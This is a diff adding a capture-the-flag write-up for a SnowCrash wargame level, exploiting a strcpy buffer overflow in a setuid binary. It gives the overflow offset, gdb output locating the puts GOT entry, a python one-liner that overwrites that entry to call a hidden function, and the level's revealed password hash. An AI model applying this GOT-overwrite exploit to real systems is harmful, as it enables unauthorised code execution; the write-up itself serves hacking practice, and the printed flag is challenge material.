@@ -1,0 +1,32 @@
+# We face another overflow of strcpy
+
+# Here, the function m prints our c variable so we must call this function
+	instead of puts("~~").
+# We will be able to print the content of /home/user/level8/.pass
+
+# The overflow occurs at 21 char
+level7@SnowCrash:~$ ./level7 $(python -c 'print "A"*20') "OSEF/20"
+~~
+level7@SnowCrash:~$ ./level7 $(python -c 'print "A"*21') "OSEF/20"
+Segmentation fault (core dumped)
+
+===============================================================================
+(gdb) info func
+[...]
+0x08048400  puts@plt
+0x080484f4  m
+[...]
+
+(gdb) x/3i 0x08048400
+   0x8048400 <puts@plt>:	jmp    *0x8049928 # Address of put in GOT
+   0x8048406 <puts@plt+6>:	push   $0x28
+   0x804840b <puts@plt+11>:	jmp    0x80483a0
+
+# Ok let's overflow to change var3 so we can write whatever we want wherever we want
+
+# We just have to put the address of put in our GOT (first arg) then write
+	the address of m instead (second arg) :)
+
+level7@SnowCrash:~$ ./level7 $(python -c 'print "A"*20+"\x28\x99\x04\x08"') "$(python -c 'print "\xf4\x84\x04\x08"')"
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1659699390
